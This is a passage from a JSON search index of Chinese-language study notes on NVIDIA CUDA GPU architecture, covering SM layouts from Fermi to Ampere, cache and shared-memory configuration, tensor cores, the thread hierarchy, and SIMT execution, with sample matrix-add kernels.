<li>\u6bcf\u4e2a SM \u53ef\u4ee5\u6709\u5f88\u591a\u7ebf\u7a0b\u5757</li> </ul> <p>A GTX560 can have 8 SM *8 blocks = 64 blocks at a time or 8 SM* 48 warps = 512 warps if the kernel does not max out registers or shared memory. At any given time on a portion of the work will be active on SMs. Each SM has multiple execution units (more than CUDA cores). Which resources are in use at any given time is dependent on the warp schedulers and instruction mix of the application. If you don't do TEX operations then the TEX units will be idle. If you don't do a special floating point operation the SUFU units will idle.</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#gf104-\u7684\u8d85\u6807\u91cf","title":"GF104 \u7684\u8d85\u6807\u91cf","text":"<p>GF104: NVIDIA Goes Superscalar - NVIDIA\u2019s GeForce GTX 460: The $200 King \u6709\u4e09\u7ec4 cuda block\uff0c\u4f46\u662f\u53ea\u6709\u4e24\u4e2a warp \u8c03\u5ea6\u5668 </p> <p>GF100 \u662f 32 \u4e2a CUDA \u6bcf SM</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u767d\u76ae\u4e66","title":"\u767d\u76ae\u4e66","text":"<p>Microsoft Word - NVIDIA Fermi Architecture Whitepaper.docx</p> <p>\u53cc\u53d1\u5c04 </p> <p>Fermi\u2019s dual warp scheduler selects two warps, and issues one instruction from each warp to a group of sixteen cores, sixteen load/store units, or four SFUs. Because warps execute independently, Fermi\u2019s scheduler does not need to check for dependencies from within the instruction stream. Using this elegant model of dual-issue, Fermi achieves near peak hardware performance. Most instructions can be dual issued; two integer instructions, two floating instructions, or a mix of integer, floating point, load, store, and SFU instructions can be issued concurrently. Double precision instructions do not support dual dispatch with any other operation.</p> <p>\u53ef\u914d\u7f6e\u7684 shared memory \u548c L1 cache</p> <p>G80 and GT200 have 16 KB of shared memory per SM. In the Fermi architecture, each SM has 64 KB of on-chip memory that can be configured as 48 KB of Shared memory with 16 KB of L1 cache or as 16 KB of Shared memory with 48 KB of L1 cache.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#kepler","title":"Kepler","text":"<ul> <li>\u4e00\u4e2a SMX 192 \u4e2a CUDA </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#maxwell","title":"Maxwell","text":"<ul> <li>SMM\uff1a\u56db\u4e2a\u5904\u7406\u5757 (processing block)\uff0c\u6bcf\u4e2a\u6709\u4e13\u7528\u7684 warp \u8c03\u5ea6\u5668\uff0c\u5305\u542b 32 \u4e2a core </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#pascal","title":"pascal","text":"<p>NVIDIA GeForce GTX 1080 Ti Specs | TechPowerUp GPU Database GeForce GTX 1080 Whitepaper</p> <p>Compute Capability: 6.0\uff08P100\uff09, 6.1\uff08GTX 10x\u3001P40\u3001P6\u3001P4\uff09, 6.2</p> <p>Pascal GPUs are composed of different configurations of Graphics Processing Clusters (GPCs), Streaming Multiprocessors (SMs), and memory controllers. The combination of one SM plus one Polymorph Engine is referred to as a TPC.</p> <p>\u6211\u627e\u5230\u7684 GP104 \u7684\u56fe (6.1) </p> <p>GP100 \u662f\u8fd9\u6837\u7684 (6.0) GP100 Pascal Whitepaper </p> <p>CUDA C++ Programming Guide - 64 (compute capability 6.0) or 128 (6.1 and 6.2) CUDA cores for arithmetic operations, - 16 (6.0) or 32 (6.1 and 6.2) special function units for single-precision floating-point transcendental functions, - 2 (6.0) or 4 (6.1 and 6.2) warp schedulers.</p> <p>While Fermi and Kepler GPUs featured a 64 KB configurable shared memory and L1 cache that could split the allocation of memory between L1 and shared memory functions depending on workload, beginning with Maxwell, the cache hierarchy was changed. The GP100 SM has its own dedicated pool of shared memory (64 KB/SM) and an L1 cache that can also serve as a texture cache depending on workload. The unified L1/texture cache acts as a coalescing buffer for memory accesses, gathering up the data requested by the threads of a warp prior to delivery of that data to the warp</p> <p>Pascal Tuning Guide</p> <p>Pascal architecture comprises two major variants: GP100 and GP104.2\u00a0A detailed overview of the major improvements in GP100 and GP104 over earlier NVIDIA architectures are described in a pair of white papers entitled\u00a0NVIDIA Tesla P100: The Most Advanced Datacenter Accelerator Ever Built\u00a0for GP100 and\u00a0NVIDIA GeForce GTX 1080: Gaming Perfected\u00a0for GP104.</p> <p>Pascal provides improved FP16 support for applications, like deep learning, that are tolerant of low floating-point precision.</p> <p>GP100 and GP104 provide different FP16 throughputs. GP100, designed with training deep neural networks in mind, provides FP16 throughput up to 2x that of FP32 arithmetic. On GP104, FP16 throughput is lower, 1/64th that of FP32. However, compensating for reduced FP16 throughput, GP104 provides additional high-throughput INT8 support not available in GP100.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#unified-l1texture-cache","title":"Unified L1/Texture Cache","text":"<p>Like Maxwell, Pascal combines the functionality of the L1 and texture caches into a unified L1/Texture cache which acts as a coalescing buffer for memory accesses</p> <p>GP104 \u9ed8\u8ba4 global load \u4e0d\u4f7f\u7528 cache\u3002</p> <p>By default, GP100 caches global loads in the L1/Texture cache. In contrast, GP104 follows Maxwell in caching global loads in L2 only, unless using the\u00a0LDG\u00a0read-only data cache mechanism. As with previous architectures, GP104 allows the developer to opt-in to caching all global loads in the unified L1/Texture cache by passing the\u00a0<code>-Xptxas\u00a0-dlcm=ca</code>\u00a0flag to\u00a0<code>nvcc</code>\u00a0at compile time.</p> <p>L1 cacheline \u4f7f\u7528 32B \uff1f\u4e4b\u524d Maxwell bypass L1 \u7684\u539f\u56e0\u662f\u7c92\u5ea6\u4e3a 128B\uff0c\u6ca1\u6709 sector cache\u3002</p> <p>Kepler serviced loads at a granularity of 128B when L1 caching of global loads was enabled and 32B otherwise. On Pascal the data access unit is 32B regardless of whether global loads are cached in L1. So it is no longer necessary to turn off L1 caching in order to reduce wasted global memory transactions associated with uncoalesced accesses.</p> <p>L1/Texture cache which acts as a coalescing buffer for memory accesses, gathering up the data requested by the threads of a warp prior to delivery of that data to the warp.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#shared-memory","title":"shared memory","text":"<p>Kepler \u548c L1 \u516c\u7528\uff0cMaxwell \u548c Pascal \u4f7f\u7528\u5355\u72ec\u7684\u7a7a\u95f4\u3002</p> <ul> <li>GP100 64KB</li> <li>GP104 96KB</li> </ul> <p>For Kepler, shared memory and the L1 cache shared the same on-chip storage. Maxwell and Pascal, by contrast, provide dedicated space to the shared memory of each SM, since the functionality of the L1 and texture caches have been merged. This increases the shared memory space available per SM as compared to Kepler: GP100 offers 64 KB shared memory per SM, and GP104 provides 96 KB per SM.</p> <ul> <li>Algorithms with significant shared memory capacity requirements (e.g., radix sort) see an automatic 33% to 100% boost in capacity per SM on top of the aggregate boost from higher SM count.</li> <li>Applications no longer need to select a preference of the L1/shared split for optimal performance</li> </ul> <p>\u5355\u4e2a\u7ebf\u7a0b\u5757\u6700\u5927\u4e3a 48KB</p> <p>Thread-blocks remain limited to 48 KB of shared memory. For maximum flexibility, NVIDIA recommends that applications use at most 32 KB of shared memory in any one thread block. This would, for example, allow at least two thread blocks to fit per GP100 SM, or 3 thread blocks per GP104 SM.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#volta","title":"volta","text":"<p>Compute Capability: 7.0\uff08TITAN V\u3001V100\uff09, 7.2\uff08Xavier\uff09</p> <ul> <li>SM\uff1a4 \u4e2a block</li> <li>\u5c06\u4e00\u4e2a CUDA \u62c6\u5206\u6210 FP32 \u548c INT32\uff0c\u6bcf\u4e2a\u5468\u671f\u53ef\u4ee5\u540c\u65f6\u6267\u884c\u6d6e\u70b9\u548c\u6574\u6570\u3002</li> <li>\u6dfb\u52a0 tensor core </li> </ul> <p>Volta Tuning Guide</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#sm","title":"SM","text":"<p>Each Volta SM includes 4 warp-scheduler units. Each scheduler handles a static set of warps and issues to a dedicated set of arithmetic instruction units.</p> <p>Instructions are performed over two cycles,  and the schedulers can issue independent instructions every cycle. </p> <p>Dependent instruction issue latency for core FMA math operations are reduced to four clock cycles, compared to six cycles on Pascal. \u00a0As a result, execution latencies of core math operations can be hidden by as few as 4 warps per SM, , assuming 4-way instruction-level parallelism\u00a0ILP\u00a0per warp, or by 16 warps per SM without any instuction-level parallelism.</p> <p>Similar to GP100, the GV100 SM provides 64 FP32 cores and 32 FP64 cores. The GV100 SM additionally includes 64 INT32 cores and 8 mixed-precision Tensor Cores. GV100 provides up to 84 SMs.</p> <p>dedicated FP32 and INT32 cores. This enables simultaneous execution of FP32 and INT32 operations.</p> <p>HBM \u5e26\u5bbd\u589e\u5927\u4e86\uff0cSM \u6570\u91cf\u56e0\u6b64\u4e5f\u589e\u52a0\u4e86\uff0c\u6765\u4fdd\u8bc1 \u6709\u5927\u91cf\u7684 reads-in-flight his is accomplished by the large complement of SMs in GV100, which typically boost the number of concurrent threads, and thus the reads-in-flight, compared to previous architectures. Resource-constrained kernels that are limited to low occupancy may benefit from increasing the number of concurrent memory accesses per thread.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#unified-shared-memoryl1tex-cache","title":"unified shared memory/L1/Tex cache","text":"<p>carveout \u9009\u62e9</p> <p>In Volta the L1 cache, texture cache, and shared memory are backed by a combined 128 KB data cache. As in previous architectures, the portion of the cache dedicated to shared memory (known as the\u00a0carveout) can be selected at runtime using\u00a0<code>cudaFuncSetAttribute()</code>\u00a0with the attribute\u00a0<code>cudaFuncAttributePreferredSharedMemoryCarveout</code>. Volta supports shared memory capacities of 0, 8, 16, 32, 64, or 96 KB per SM.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#turing","title":"turing","text":"<p>Compute Capability: 7.5\uff08RTX 20x\u3001T4\uff09</p> <p>Slide 1</p> <p> </p> <p>Tensor core \u652f\u6301\u6574\u6570\u77e9\u9635\u4e58 Turing adds acceleration for integer matrix multiply operations.</p> <p>Any binary compiled for Volta will run on Turing, but Volta binaries using Tensor Cores will only be able to reach half of Turing\u2019s Tensor Core peak performance. Recompiling the binary specifically for Turing would allow it to reach the peak performance.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#ampere-\u67b6\u6784","title":"ampere \u67b6\u6784","text":"<p>Compute Capability: 8.0\uff08A100\u3001A30\uff09, 8.6\uff08RTX 30x\u3001A40\u3001A16\u3001A10\u3001A2\uff09, 8.7\uff08Orin\uff09</p> <p></p> <p>nvidia-ampere-ga-102-gpu-architecture-whitepaper-v2.pdf In the Turing generation, each of the four SM processing blocks (also called partitions) had two primary datapaths, but only one of the two could process FP32 operations. The other datapath was limited to integer operations. GA10x includes FP32 processing on both datapaths, doubling the peak processing rate for FP32 operations</p> <p>NVIDIA Ampere GPU Architecture Tuning Guide</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#occupancy","title":"occupancy","text":"<ul> <li>For devices of compute capability 8.0 (i.e., A100 GPUs) shared memory capacity per SM is 164 KB, a 71% increase compared to V100\u2019s capacity of 96 KB. For GPUs with compute capability 8.6, shared memory capacity per SM is 100 KB.</li> </ul> <p>async data copy from global memory to shared memory</p> <ul> <li>avoid using extra registers</li> <li>bypass the L1 cache.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7b2c\u4e09\u4ee3-tensor-core","title":"\u7b2c\u4e09\u4ee3 tensor core","text":"<ul> <li>Support for FP64 Tensor Core, using new DMMA instructions.</li> </ul> <ul> <li>Support for Bfloat16 Tensor Core, through HMMA instructions. BFloat16 format is especially effective for DL training scenarios. Bfloat16 provides 8-bit exponent i.e., same range as FP32, 7-bit mantissa and 1 sign-bit.</li> </ul> <ul> <li>Support for TF32 Tensor Core, through HMMA instructions. TF32 is a new 19-bit Tensor Core format that can be easily integrated into programs for more accurate DL training than 16-bit HMMA formats. TF32 provides 8-bit exponent, 10-bit mantissa and 1 sign-bit.</li> </ul> <ul> <li>Support for bitwise\u00a0<code>AND</code>\u00a0along with bitwise\u00a0<code>XOR</code>\u00a0which was introduced in Turing, through BMMA instructions.</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#unified-l1","title":"Unified L1","text":"<p>The NVIDIA A100 GPU based on compute capability 8.0 increases the maximum capacity of the combined L1 cache, texture cache and shared memory to 192 KB, 50% larger than the L1 cache in NVIDIA V100 GPU. The combined L1 cache capacity for GPUs with compute capability 8.6 is 128 KB.</p> <p>L2 \u63d0\u5347 7 \u500d \u00a040 MB in Tesla A100, which is 7x larger than Tesla V100.</p> <p><code>0, 8, 16, 32, 64, 100, 132 or 164</code></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda-\u67b6\u6784","title":"CUDA \u67b6\u6784","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>CUDA C++ Programming Guide (nvidia.com)</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u57fa\u7840","title":"\u57fa\u7840","text":"<p>In CUDA programming, both CPUs and GPUs are used for computing. Typically, we refer to CPU and GPU system as\u00a0host\u00a0and\u00a0device, respectively. CPUs and GPUs are separated platforms with their own memory space. Typically, we run serial workload on CPU and offload parallel computation to GPUs.</p> <ul> <li>\u4e09\u4e2a\u5173\u952e\u62bd\u8c61\uff1a<ul> <li>\u5c42\u6b21\u5316\u7684\u7ebf\u7a0b\u7ec4</li> <li>\u5171\u4eab\u5185\u5b58</li> <li>\u540c\u6b65</li> </ul> </li> </ul> <p>\u9ad8\u5ea6\u53ef\u6269\u5c55\u6027\uff1a </p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7f16\u7a0b\u6a21\u578b","title":"\u7f16\u7a0b\u6a21\u578b","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7ebf\u7a0b\u5c42\u6b21","title":"\u7ebf\u7a0b\u5c42\u6b21","text":"<p>kernel</p> <ul> <li>C++ \u51fd\u6570\uff0c\u88ab\u8c03\u7528\u65f6\uff0c\u4f1a\u88ab\u6bcf\u4e2a CUDA \u7ebf\u7a0b\u5e76\u884c\u6267\u884c\u3002</li> <li>\u4f7f\u7528__global__\u58f0\u660e kernel \u51fd\u6570</li> <li>\u4f7f\u7528<code>&lt;&lt;&lt;...&gt;&gt;&gt;</code>execution configuration\u00a0syntax\uff0c\u6307\u5b9a\u4f7f\u7528\u591a\u5c11\u7ebf\u7a0b\u6267\u884c\u8be5 kernel</li> </ul> <p>\u7ebf\u7a0b\u5c42\u6b21</p> <ul> <li>block\uff1a\u591a\u4e2a\u7ebf\u7a0b\u7ec4\u6210\u4e00\u4e2a\u7ebf\u7a0b\u5757\u3002\u53ef\u4ee5\u662f 1,2,3 \u7ef4\u7684<ul> <li>\u901a\u8fc7<code>threadIdx</code>\u7d22\u5f15\u3002\u5982\u4e8c\u7ef4 (x, y)\u00a0\u7684\u7ebf\u7a0b id \u662f\u00a0(x + y Dx);</li> <li>\u4e00\u4e2a\u5757\u5185\u7684\u7ebf\u7a0b\u6570\u662f\u6709\u9650\u5236\u7684\uff08\u5f53\u524d\u7684 GPU \u4e00\u822c\u4e3a 1024 \u4e2a\uff09\u3002\u56e0\u4e3a\u4e00\u4e2a\u5757\u5185\u7684\u7ebf\u7a0b\u4f1a\u88ab\u8c03\u5ea6\u5230\u4e00\u4e2a SM(streaming multiprocessor core) \u4e2d\uff0c\u5171\u4eab\u8be5 SM \u7684\u7247\u4e0a\u5b58\u50a8\uff08shared memory\uff09</li> <li>\u4e00\u4e2a\u5757\u662f\u72ec\u7acb\u7684\uff0c\u53ef\u4ee5\u4ee5\u4efb\u610f\u987a\u5e8f\u8c03\u5ea6\uff0c\u4ece\u800c\u4fdd\u8bc1\u4e86 GPU \u7684\u53ef\u6269\u5c55\u6027\uff08SM \u662f\u57fa\u672c\u5355\u5143\uff0c\u5806 SM\uff09</li> <li>shared memory \u5ef6\u8fdf\u5f88\u4f4e\uff0c\u7c7b\u4f3c\u4e8e L1 cache</li> </ul> </li> <li>grid\uff1a\u591a\u4e2a\u7ebf\u7a0b\u5757\u7ec4\u6210\u4e00\u4e2a grid\u3002\u53ef\u4ee5\u662f 1,2,3 \u7ef4\u7684<ul> <li>\u901a\u8fc7<code>blockIdx</code>\u7d22\u5f15</li> </ul> </li> </ul> <p>\u4ee5\u4e0b\u4ee3\u7801\u58f0\u660e\u4e86 1 \u4e2a\u7ebf\u7a0b\u5757\uff0c\u5927\u5c0f\u4e3a NxN\u3002\u7528\u4e8e\u5c06\u4e24\u4e2a NxN \u7684\u77e9\u9635\u76f8\u52a0\u3002</p> <pre><code>// Kernel definition\n__global__ void MatAdd(float A[N][N], float B[N][N],\n                       float C[N][N])\n{\n    int i = threadIdx.x;\n    int j = threadIdx.y;\n    C[i][j] = A[i][j] + B[i][j];\n}\n\nint main()\n{\n    ...\n    // Kernel invocation with one block of N * N * 1 threads\n    int numBlocks = 1;\n    dim3 threadsPerBlock(N, N);\n    MatAdd&lt;&lt;&lt;numBlocks, threadsPerBlock&gt;&gt;&gt;(A, B, C);\n    ...\n}\n</code></pre> <p>\u4ee5\u4e0b\u4ee3\u7801\u58f0\u660e\u4e86 N/16 x N/16 \u4e2a\u7ebf\u7a0b\u5757\uff0c\u6bcf\u4e2a\u5927\u5c0f\u4e3a 16x16\u3002\u7528\u4e8e\u5c06\u4e24\u4e2a NxN \u7684\u77e9\u9635\u76f8\u52a0\u3002</p> <pre><code>// Kernel definition\n__global__ void MatAdd(float A[N][N], float B[N][N],\nfloat C[N][N])\n{\n    int i = blockIdx.x * blockDim.x + threadIdx.x;\n    int j = blockIdx.y * blockDim.y + threadIdx.y;\n    if (i &lt; N &amp;&amp; j &lt; N)\n        C[i][j] = A[i][j] + B[i][j];\n}\n\nint main()\n{\n    ...\n    // Kernel invocation\n    dim3 threadsPerBlock(16, 16);\n    dim3 numBlocks(N / threadsPerBlock.x, N / threadsPerBlock.y);\n    MatAdd&lt;&lt;&lt;numBlocks, threadsPerBlock&gt;&gt;&gt;(A, B, C);\n    ...\n}\n</code></pre> <p></p> <ul> <li>\u5728\u7ebf\u7a0b\u5757\u5185\uff0c\u7ebf\u7a0b\u901a\u8fc7 shared memory \u6765\u5171\u4eab\u6570\u636e\u3002\u5e76\u4e14\u901a\u8fc7\u540c\u6b65\u64cd\u4f5c\u6765\u534f\u8c03\u5185\u5b58\u8bbf\u95ee<ul> <li><code>__syncthreads()</code>\u7528\u4e8e\u8def\u969c\u540c\u6b65</li> </ul> </li> </ul> <ul> <li>\u7ebf\u7a0b\u5757\u851f\uff1a<ul> <li>CUDA 9.0 \u4e2d\u5f15\u5165\u7684\u4e00\u4e2a\u53ef\u9009\u5c42\u6b21</li> <li>\u7c7b\u4f3c\u4e8e\u7ebf\u7a0b\u5757\u5185\u7ebf\u7a0b\u4fdd\u8bc1\u5728\u540c\u4e00\u4e2a SM\u3002\u4e00\u4e2a cluster \u5185\u7684\u7ebf\u7a0b\u5757\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a GPU Processing Cluster (GPC)</li> <li>\u5927\u5c0f\u4e00\u822c\u6700\u5927 8 \u4e2a\u5757</li> <li>\u652f\u6301\u786c\u4ef6\u652f\u6301\u7684\u540c\u6b65 api\u3002cluster.sync() </li> </ul> </li> </ul> <p>Threads within a CTA execute in SIMT (single-instruction, multiple-thread) fashion in groups called\u00a0warps.</p> <p>SIMD \u548c SIMT \u7684\u533a\u522b\uff1aSIMT \u7f16\u7a0b\u65f6\u53ef\u4ee5\u63a7\u5236\u5355\u4e2a\u7ebf\u7a0b\u3002</p> <p>A key difference is that SIMD vector organizations expose the SIMD width to the software, whereas SIMT instructions specify the execution and branching behavior of a single thread. In contrast with SIMD vector machines, SIMT enables programmers to write thread-level parallel code for independent, scalar threads, as well as data-parallel code for coordinated threads.</p> <p>SM \u80fd\u4e00\u6b21\u80fd\u6267\u884c\u591a\u5c11 block\uff0c\u548c\u6bcf\u7ebf\u7a0b register \u6570\u548c block \u4f7f\u7528\u7684 shared memory \u6709\u5173\u3002\u56e0\u4e3a SM \u7684\u5bc4\u5b58\u5668\u548c shared memory \u662f\u7ed9 batch block \u6240\u6709\u7ebf\u7a0b\u95f4\u5206\u914d\u7684\u3002\u5982\u679c\u4e00\u4e2a\u5757\u90fd\u6267\u884c\u4e0d\u4e86\uff0c\u5219 kernel \u65e0\u6cd5\u542f\u52a8\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7f16\u7a0b\u63a5\u53e3","title":"\u7f16\u7a0b\u63a5\u53e3","text":"<ul> <li>\u5305\u542b\u5bf9 C++ \u7684\u5c11\u91cf\u6269\u5c55\u548c rutime \u5e93</li> </ul> <p>C++ \u6269\u5c55</p> <ul> <li>\u5b9a\u4e49 kernel</li> <li>\u6307\u5b9a\u7ebf\u7a0b\u6570</li> </ul> <p>CUDA runtime</p> <ul> <li>\u6267\u884c\u5728 host \u4e0a</li> <li>\u5206\u914d\u56de\u6536 device \u5185\u5b58</li> <li>\u5728 host \u548c device \u95f4\u4f20\u8f93\u6570\u636e</li> <li>\u7ba1\u7406\u591a\u4e2a device</li> </ul> <p>\u7f16\u8bd1</p> <ul> <li>\u5c06 device \u4ee3\u7801\u7f16\u8bd1\u6210 ptx \u6216 cubin</li> <li>\u5c06 host \u4ee3\u7801\u7f16\u8bd1\uff0c\u548c runtime \u94fe\u63a5<ul> <li>runtime \u57fa\u4e8e\u5e95\u5c42\u53e6\u4e00\u5c42\u62bd\u8c61\u5c42\uff0c\u8be5\u62bd\u8c61\u5c42\u518d\u57fa\u4e8e driver API\u3002</li> </ul> </li> </ul> <p>\u517c\u5bb9\u6027</p> <ul> <li>cubin \u53ea\u80fd\u5728\u5c0f\u7248\u672c\u91cc\u540e\u5411\u517c\u5bb9\u3002cubin\u00a0object generated for compute capability\u00a0X.y\u00a0will only execute on devices of compute capability\u00a0X.z\u00a0where\u00a0z\u2265y.</li> <li>PTX \u53ef\u4ee5\u540e\u5411\u517c\u5bb9\uff0c\u4f46\u662f\u65e0\u6cd5\u5229\u7528\u65b0\u786c\u4ef6\u7279\u6027\u3002a binary targeting devices of compute capability 7.0 (Volta) compiled from PTX generated for compute capability 6.0 (Pascal) will not make use of Tensor Core instructions, since these were not available on Pascal.</li> <li>\u540e\u5411\u517c\u5bb9 (backward)\uff1a\u65e7\u7f16\u8bd1\u7684\u53ef\u4ee5\u5728\u65b0\u5e73\u53f0\u4e0a\u8fd0\u884c</li> </ul> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u786c\u4ef6\u5b9e\u73b0","title":"\u786c\u4ef6\u5b9e\u73b0","text":"<p>https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#hardware-implementation</p> <p>The NVIDIA GPU architecture is built around a scalable array of multithreaded\u00a0Streaming Multiprocessors\u00a0(SMs). When a CUDA program on the host CPU invokes a kernel grid, the blocks of the grid are enumerated and distributed to multiprocessors with available execution capacity. The threads of a thread block execute concurrently on one multiprocessor, and multiple thread blocks can execute concurrently on one multiprocessor. As thread blocks terminate, new blocks are launched on the vacated multiprocessors.</p> <ul> <li>\u82f1\u4f1f\u8fbe GPU \u67b6\u6784\u7531 SM \u6570\u7ec4\u7ec4\u6210\uff0c\u5177\u6709\u53ef\u6269\u5c55\u6027\u3002</li> <li>\u5f53 host \u4e0a\u7684\u4e00\u4e2a CUDA \u7a0b\u5e8f\u8c03\u7528\u4e00\u4e2a kernel grid \u65f6\uff0cgrid \u4e2d\u7684\u7ebf\u7a0b\u5757\u88ab\u5206\u53d1\u5230\u6709\u8ba1\u7b97\u80fd\u529b\u7684 SM \u4e0a\u6267\u884c\u3002</li> <li>\u4e00\u4e2a\u7ebf\u7a0b\u5757\u5185\u7684\u7ebf\u7a0b\u5728\u4e00\u4e2a multiprocessor \u5185\u5e76\u53d1\u6267\u884c\uff0c\u5e76\u4e14\u591a\u4e2a\u7ebf\u7a0b\u5757\u4e5f\u53ef\u4ee5\u5e76\u53d1\u8c03\u5ea6\u5230\u4e00\u4e2a SM \u4e0a\uff08\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u5757\u7ec8\u6b62\u65f6\uff0c\u65b0\u7684\u5757\u8865\u4e0a\uff09 p.s \u8fd9\u91cc\u8bf4\u7684\u662f\u5e76\u53d1\uff0c\u53ef\u80fd\u9700\u8981\u548c\u5e76\u884c\u533a\u5206</li> </ul> <ul> <li>SM \u88ab\u8bbe\u8ba1\u6765\u5e76\u53d1\u6267\u884c\u4e0a\u767e\u4e2a\u7ebf\u7a0b\uff0c\u91c7\u7528\u4e86 SIMT \u67b6\u6784\uff08Single-Instruction, Multiple-Thread\uff09<ul> <li>\u5355\u7ebf\u7a0b\u5185\u5229\u7528\u6d41\u6c34\u7ebf\u5b9e\u73b0 ILP</li> <li>\u901a\u8fc7\u540c\u65f6\u591a\u7ebf\u7a0b\uff08simultaneous hardware multithreading\uff09\u5b9e\u73b0\u7ebf\u7a0b\u7ea7\u5e76\u884c<ul> <li>\u548c CPU \u7684 SMT \u4e0d\u540c\u3002Unlike CPU cores, they are issued in order and there is no branch prediction or speculative execution.</li> </ul> </li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#simt","title":"SIMT","text":"<p>\u81ea\u5df1\u7684\u7406\u89e3\uff1aCPU \u4e00\u4e2a\u6838\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u4e24\u4e2a\u7ebf\u7a0b\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\uff0c\u800c GPU \u4e00\u4e2a SM \u53ef\u4ee5\u5e76\u53d1\u8fd0\u884c\u6210\u767e\u4e0a\u5343\u7684\u7ebf\u7a0b\u3002\u4e3a\u4e86\u505a\u5230\u8fd9\u70b9\uff0c\u91c7\u7528\u4e86 SIMT \u6280\u672f</p> <ul> <li>warp</li> <li>warp \u5185\u7684\u7ebf\u7a0b\u6267\u884c</li> </ul> <ul> <li>SM \u4ee5\u4e00\u4e2a warp 32 \u4e2a\u7ebf\u7a0b\u4e3a\u5355\u4f4d\uff0c\u8fdb\u884c\u8c03\u5ea6\u3002The multiprocessor creates, manages, schedules, and executes threads in groups of 32 parallel threads called\u00a0warps.</li> <li>\u6bcf\u4e2a warp \u7684\u7ebf\u7a0b\u4ece\u76f8\u540c\u7684 PC \u5f00\u59cb\u6267\u884c\u3002\u4f46\u662f\u5b83\u4eec\u5185\u90e8\u6709\u81ea\u5df1\u7684 PC \u53ef\u4ee5\u5355\u72ec\u8df3\u8f6c\u3002Individual threads composing a warp start together at the same program address, but they have their own instruction address counter and register state and are therefore free to branch and execute independently.</li> <li>SM \u5c06\u7ebf\u7a0b\u5757\u5212\u5206\u4e3a warp \u8fdb\u884c\u8c03\u5ea6\u3002When a multiprocessor is given one or more thread blocks to execute, it partitions them into warps and each warp gets scheduled by a\u00a0warp scheduler\u00a0for execution</li> 